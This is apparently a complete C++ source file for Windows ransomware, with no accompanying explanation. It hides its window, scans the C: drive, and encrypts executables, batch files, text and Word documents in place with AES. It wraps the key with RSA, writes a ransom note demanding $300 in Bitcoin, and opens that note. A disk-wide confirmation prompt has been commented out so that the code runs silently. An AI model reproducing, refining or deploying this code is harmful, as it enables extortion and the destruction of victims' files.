#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <string>
#include <fstream>
#include <iostream>
#include <Windows.h>

#include "aes256.cpp"
#include "keygen.cpp"
#include "rsaproj.cpp"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define BUFFER_SIZE 1024*1024

#ifdef __APPLE__
#define fseeko64 fseeko
#endif

using namespace std;

void encrypt(char *ginput, char *gkey) {
    ByteArray key, enc;
    size_t file_len;
    FILE *input, *output;
    srand(time(0));
    size_t key_len = 0;
    char *goutput = (char*)"tmp";
    while(gkey[key_len])
        key.push_back(gkey[key_len++]);
    input = fopen(ginput, "rb");
    output = fopen(goutput, "wb");
    Aes256 aes(key);
    fseeko64(input, 0, SEEK_END);
    file_len = ftell(input);
    fseeko64(input, 0, SEEK_SET);
    enc.clear();
    aes.encrypt_start(file_len, enc);
    fwrite(enc.data(), enc.size(), 1, output);
    while (!feof(input)) {
        unsigned char buffer[BUFFER_SIZE];
        size_t buffer_len;
        buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
        if (buffer_len > 0) {
            enc.clear();
            aes.encrypt_continue(buffer, buffer_len, enc);
            fwrite(enc.data(), enc.size(), 1, output);
            }
        }
        enc.clear();
        aes.encrypt_end(enc);
        fwrite(enc.data(), enc.size(), 1, output);
        fclose(input);
        fclose(output);
        CopyFile(goutput, ginput, 0);
}

bool endsWith(const std::string &mainStr, const std::string &toMatch)
{
    if(mainStr.size() >= toMatch.size() &&
       mainStr.compare(mainStr.size() - toMatch.size(), toMatch.size(), toMatch) == 0)
        return true;
    else
        return false;
}


int main(int argc, char** argv) {
      ShowWindow(::GetConsoleWindow(), SW_HIDE);

//    cout << "Are you sure you want to encrypt your whole disk? y/n -> ";
//    char choice = 'n';
//    cin >> choice;
//    if (choice != 'y') {
//        exit(0);
//    }

    string key_str = keygen(16);
    char *key = new char[key_str.length() + 1];
    strcpy(key, key_str.c_str());
    key_str = ttn(key);
    cout << "Key:" << key << "\n";
    cout << "Number key -> " << key_str << "\n";


    string rsa_key = encrypt_rsa(key_str);
    cout << "RSA key -> " << rsa_key << "\n";

    DWORD mydrives = 100;
    char lpBuffer[100];
    DWORD GLDS = GetLogicalDriveStrings(mydrives, (LPSTR) lpBuffer);

    for(int i = 0; i < 100; i++)
        if(lpBuffer[i] && lpBuffer[i] <= 'C') {
            snprintf(lpBuffer, sizeof(lpBuffer), "%c", lpBuffer[i]);
            string buffAsStdStr = lpBuffer;
            string result = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> list";
            cout << result + '\n';
            system(result.c_str());

            string result2 = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> C:\\PerfLogs\\list";
            system(result2.c_str());
        }

    cout << "Done scanning the disk!\n";

    ifstream ifs("list");
    string line;

    while(getline(ifs, line))
    {
        if (line.find("Windows") != string::npos) {
            continue;
        }
        else if (endsWith(line, "decrypt.exe")) {
            continue;
        }
        else if (line.find("temp") != string::npos) {
            continue;
        }
        else if (line.find("Temp") != string::npos) {
            continue;
        }
        else if (endsWith(line, ".dll")) {
            if (line.find("Nls") != string::npos) {
                continue;
            }
        }
        else if (endsWith(line, ".exe")) {
        }
        else if (endsWith(line, ".bat")) {
        }
        else if (endsWith(line, ".txt")) {
        }
        else if (endsWith(line, ".docx")) {
        }
        else if (endsWith(line, ".doc")) {
        }
        else {
            continue;
        }
        char *line_char = new char[line.length() + 1];
        strcpy(line_char, line.c_str());
        cout << line_char << "\n";
        encrypt(line_char, key);

    }

    fstream fs;
    fs.open ("YOU_ARE_INFECTED!.txt", fstream::in | fstream::out | fstream::app);

    fs << "YOUR FILES HAVE BEEN ENCRYPTED WITH MY RANSOMWARE! THIS IS YOUR ONLY CHANCE TO CONTACT ME AND DECRYPT!\n"
          "\nHow to get the key\n"
          "\n"
          "    Send 300$ Bitcoin to this address [Wallet Address]. (You can buy Bitcoin here)\n"
          "    Send email to this address [myemail@email.com] your transaction ID, your email address and your decryption code [" << rsa_key << "]. You will get an email with the key to decrypt after 12 - 48 hours.\n"
          "Your decrypt.exe program is in C:\\PerfLogs";

    fs.close();

    // Opening TXT
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = L"YOU_ARE_INFECTED!.txt";
    sei.lpVerb = L"open";
    sei.nShow = SW_SHOWNORMAL;
    ShellExecuteExW(&sei);


    cout << "Done encrypting, bye bye! ;)\n";
    return 0;
}